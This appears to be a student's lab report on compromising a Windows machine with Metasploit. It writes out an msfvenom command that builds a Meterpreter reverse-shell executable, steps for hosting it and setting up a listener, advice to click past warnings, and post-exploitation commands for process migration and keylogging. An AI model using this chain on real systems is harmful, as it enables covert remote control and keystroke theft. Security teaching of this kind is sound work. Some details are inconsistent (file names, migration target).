# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

## NAME: Kishore M
## Reg. No.: 212224040161

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="825" height="356" alt="image" src="https://github.com/user-attachments/assets/5e2b8b14-fd07-4608-8655-dc5eb2ec0972" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > final.exe
## OUTPUT:
<img width="773" height="145" alt="image" src="https://github.com/user-attachments/assets/db66625d-baf9-49c9-b293-6a906af5363f" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="294" height="51" alt="image" src="https://github.com/user-attachments/assets/91745023-755f-4d50-9015-d6df3036c053" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="262" height="50" alt="image" src="https://github.com/user-attachments/assets/b37bc4a5-618c-407e-9f61-36cfa8d08742" />


Check the status of apache2
## OUTPUT:

<img width="806" height="393" alt="image" src="https://github.com/user-attachments/assets/0bbf2fe2-cbfd-426c-a1fd-649d2e47cd36" />


Invoke msfconsole:
## OUTPUT:

<img width="663" height="489" alt="image" src="https://github.com/user-attachments/assets/8c3f8be5-700a-4028-98a9-7a09d0289dd0" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="944" height="986" alt="image" src="https://github.com/user-attachments/assets/5a724983-460c-4752-952c-9658c9fad443" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="857" height="822" alt="image" src="https://github.com/user-attachments/assets/b9b691fa-8f12-4b87-b8e0-0e373cac62b9" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/d40656f3-2579-4579-8593-82c92a7a8c45" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/e3022f78-61e0-44e9-b362-dbead9d9406e" />


On kali/parrot give the command exploit
## OUTPUT:

<img width="889" height="166" alt="image" src="https://github.com/user-attachments/assets/a6b9899d-26a8-46bb-aa4f-5506d6f44478" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="936" height="996" alt="image" src="https://github.com/user-attachments/assets/05d81998-b40c-4426-a9f6-b91bf3f0b277" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:
<img width="342" height="69" alt="image" src="https://github.com/user-attachments/assets/216bc7fe-ac98-4b20-bb1e-6f044a438627" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:

<img width="953" height="1000" alt="image" src="https://github.com/user-attachments/assets/3897fcc8-6fd8-4023-9ac0-0447c6c1c883" />


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="304" height="42" alt="image" src="https://github.com/user-attachments/assets/6aeec1e4-6ec1-47c5-be93-7894baa06f1b" />

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/a26aa7a9-6301-48f6-9d8a-3d1ac33f20a9" />



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="756" height="266" alt="image" src="https://github.com/user-attachments/assets/96aeb7ae-bac0-4cf3-b8dc-6124d15019ed" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

